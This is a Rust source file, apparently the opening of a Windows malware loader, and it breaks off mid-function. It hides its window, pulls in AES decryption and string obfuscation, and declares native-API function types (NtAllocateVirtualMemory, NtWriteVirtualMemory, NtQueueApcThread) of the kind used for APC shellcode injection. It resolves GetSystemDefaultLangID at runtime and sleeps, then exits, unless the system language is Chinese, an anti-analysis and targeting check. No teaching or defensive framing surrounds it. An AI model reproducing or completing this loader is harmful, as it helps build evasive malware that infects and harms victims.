#![windows_subsystem = "windows"]

use windows::Win32::Foundation::{HINSTANCE, NTSTATUS};
use windows::Win32::System::LibraryLoader::{FreeLibrary, LoadLibraryA, GetProcAddress,GetModuleHandleA};
use windows::core::{PCSTR, Error};
use std::ptr::null_mut;
use std::os::raw::c_void;
use libaes::Cipher;
use obfstr::obfstr;


type NtAllocateVirtualMemory = fn(*mut c_void,*mut *mut c_void,usize,*mut usize,u32,u32)->NTSTATUS;
type NtWriteVirtualMemory = fn(*mut c_void,*mut c_void,*mut c_void,usize,*mut usize)->i32;
type NtQueueApcThread = fn(*mut c_void,Option<fn(*mut c_void, *mut c_void, *mut c_void)>,*mut c_void,*mut c_void,*mut c_void)->NTSTATUS;

fn main() {
    unsafe{
        let  p = GetModuleHandleA(PCSTR(obfstr!("kernel32.dll\0").as_ptr())).unwrap() ;
        
        let gsdl = get_addr(p,obfstr!("GetSystemDefaultLangID\0").as_bytes());
        
        let gsdl:fn()->u16 = core::mem::transmute(gsdl);
        let systemlangid = gsdl();
        if systemlangid != 2052{
            std::thread::sleep(std::time::Duration::from_millis(40000));
            std::process::exit(0);

        }
    }

